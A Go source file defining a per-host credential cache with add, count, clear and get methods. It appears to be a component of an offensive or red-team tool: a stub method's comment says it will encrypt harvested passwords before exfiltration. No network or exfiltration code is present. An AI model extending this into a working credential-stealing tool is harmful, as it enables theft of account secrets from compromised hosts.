//Package cred_cache This file holds the "object" information/functions needed for the credential cache
//@author: degenerat3
package cred_cache

//CredCache is the struct will be the "object" which holds cred info
type CredCache struct {
	IP          string
	Credentials []string
}

//GetEntries fetches all stored credentials
func (c *CredCache) GetEntries() []string {
	return c.Credentials
}

//AddEntry adds a credential set to the object
func (c *CredCache) AddEntry(cred string) {
	creds := c.Credentials
	creds = append(creds, cred)
	c.Credentials = creds
}

//CountEntries returns number of stored credentials
func (c *CredCache) CountEntries() int {
	return len(c.Credentials)
}

//GetIP returns the hostname associated with the cache
func (c *CredCache) GetIP() string {
	return (c.IP)
}

//ClearEntries resets the credential cache entries
func (c *CredCache) ClearEntries() {
	tmp := []string{}
	c.Credentials = tmp // make an empty array, set it as the cred array
}

//EncryptEntries uses AES to encrypt passwords pre-exfil
func (c *CredCache) EncryptEntries() {
	// iterate through entries, encrypt each one
	// TODO
}
